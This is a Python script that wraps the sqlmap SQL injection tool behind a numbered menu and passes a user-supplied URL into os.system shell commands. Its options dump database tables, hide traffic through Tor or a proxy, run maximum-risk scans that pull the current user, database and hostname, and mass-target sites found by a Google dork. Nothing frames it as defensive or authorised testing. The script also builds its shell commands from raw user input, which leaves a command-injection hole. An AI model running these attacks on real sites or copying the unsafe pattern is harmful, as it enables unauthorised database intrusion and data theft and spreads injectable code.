import os
import subprocess

# Define the available options with descriptions
options = {
    '1': 'Test a single URL for SQL injection',
    '2': 'Test a request file for SQL injection',
    '3': 'Dump database table for a specific column',
    '4': 'Test multiple URLs for SQL injection',
    '5': 'Test a URL using Tor network',
    '6': 'Test URL with Basic Authentication',
    '7': 'Test multiple URLs for SQL injection (alternative)',
    '8': 'Test a URL with SSL and ignore SSL errors',
    '9': 'Test a URL using a proxy',
    '10': 'Test a URL with multiple threads',
    '11': 'Comprehensive SQL injection testing with detailed options'
}

# Display available options with descriptions
print("Available options:")
for key, value in options.items():
    print(key + ". " + value)

# Ask the user to choose an option
option = input("Enter the option number to use: ")

# Run selected option
if option in options:
    site = input("Enter the site URL: ")  # Get the site URL from the user

    if option == '1':
        os.system(f'sqlmap -u "{site}" --batch')
    elif option == '2':
        os.system(f'sqlmap -r request.txt --batch')
    elif option == '3':
        os.system(f'sqlmap -D dbname -T tablename -C columnname --dump')
    elif option == '4' or option == '7':
        os.system(f'sqlmap -g "inurl:index.php?id=" --batch')
    elif option == '5':
        os.system(f'sqlmap -u "{site}" --tor')
    elif option == '6':
        os.system(f'sqlmap -u "{site}" --auth-type="BASIC" --auth-cred="user:password" --batch')
    elif option == '8':
        os.system(f'sqlmap -u "{site}" --ssl --ignore-ssl-errors')
    elif option == '9':
        os.system(f'sqlmap -u "{site}" --proxy="http://127.0.0.1:8080" --batch')
    elif option == '10':
        os.system(f'sqlmap -u "{site}" --threads=5 --batch')
    elif option == '11':
        os.system(f'sqlmap -u "{site}" --level=5 --risk=3 --cookie="user=admin;password=pass" --dbms="MySQL" --os="Linux " --current-user --current-db --hostname --timeout=10 --fresh-queries --hex --output-format="csv" --batch')
    else:
        print("Invalid option")
else:
    print("Invalid option")
